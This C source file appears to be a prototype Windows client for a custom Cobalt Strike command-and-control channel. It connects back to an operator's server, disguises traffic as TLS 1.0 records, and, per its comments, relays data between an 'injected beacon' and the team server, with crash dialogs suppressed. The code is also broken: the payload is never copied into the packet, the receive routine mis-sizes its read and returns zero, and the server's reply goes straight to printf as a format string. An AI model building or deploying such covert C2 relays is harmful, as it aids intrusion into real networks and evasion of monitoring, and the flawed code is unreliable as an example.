#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to a string containing the IP address to connect to
 * @param port A pointer to a string containing the port to connect on
 * @return A socket handle for the connection
 * @pre ip and port form a valid IP address and port number
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}

/**
 *  This function encodes a byte into a string of appropriate length.
 *  @param payload_in: the bytes to send. 
 *  @param payload_str: pointer to a buffer to write the TLS packet into.
 *  @param length: length of payload_in data. 
 *  @pre len(payload_in) = len(payload_out) - 7
 *  @post first three bytes of payload_out match TLS 1.0, bytes 4 and 5 are the length, and 
 *   	  the rest contains the contents of payload_in.
 */ 
void encode_position(char* packet_out, unsigned short length) {
	packet_out[0] = 0x17;
	packet_out[1] = 0x03;
	packet_out[2] = 0x01;
	packet_out[3] = (unsigned char)(length / 256);
	packet_out[4] = (unsigned char)length % 256;
}

// /**
//  *  This function generates an empty end transmission payload.
//  *  @param packet_out: pointer to a buffer to write the payload string into.
//  *  @pre len(packet_out) == 5.
//  *  @post packet_out represents a TLSv1.1 packet with length 0. 
//  */ 
// void encode_end_transmission(char* packet_out) {
// 	packet_out[0] = 0x17;
// 	packet_out[1] = 0x03;
// 	packet_out[2] = 0x02;
// 	packet_out[3] = 0;
// 	packet_out[4] = 0;
// }


/**
 * Sends data to server received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
*/
void sendData(SOCKET sd, char* data, DWORD len) {
	
	char* packet = malloc(5 + len);
	encode_position(packet, len);
	send(sd, packet, (len + 5), 0);
	free(packet);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 *
 * @param sd The socket file descriptor
 * @param buffer Buffer to store data in
 * @param max full size of allocated buffer
 * @return Size of data recieved
 * @pre buffer points to an allocated memory region of size max
 * @post buffer contains the data recieved from the team server
*/
DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
	
	char* total_print = malloc(30);
	WORD length = 0, total = 0, temp = 0;
	char* header = malloc(3);
	recv(sd, header, 3, 0);
	recv(sd, (char*)&length, 4, 0);
    recv(sd, buffer, length, 0);
	free(header);
	return total;
}


int main(int argc, char** argv) {
    // Set connection and IRC info
	if (argc != 4)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
		exit(1);
	}
	
	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	char* IP = argv[1];
	char* PORT = argv[2];


	// Create a connection back to our server. 
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}


	char* payloadData = (char*) malloc(PAYLOAD_MAX_SIZE);
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		free(payloadData);
		exit(1);
	}
	DWORD read_size = 0;
	// The pipe dance
	while (1) {

  
        printf("Enter data to send: (newline to exit) \n");
        printf("In a real application, this would be sent by some application like a Cobalt Strike payload.\n");
        scanf("%[^\n]", payloadData);
        if (strlen(payloadData) > 0) {
            sendData(sockfd, payloadData, strlen(payloadData));
        } else {
            printf("Goodbye!");
            break;
        }
		
    	//Read in data from server. 
		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
        printf("Message from server: \n");
        printf(buffer);


        memset(buffer, 0, BUFFER_MAX_SIZE);
        memset(payloadData, 0, PAYLOAD_MAX_SIZE);


	}
	//Free all allocated memory and close all memory leaks 
	free(payloadData);
	free(buffer);
	closesocket(sockfd);

	exit(0);
}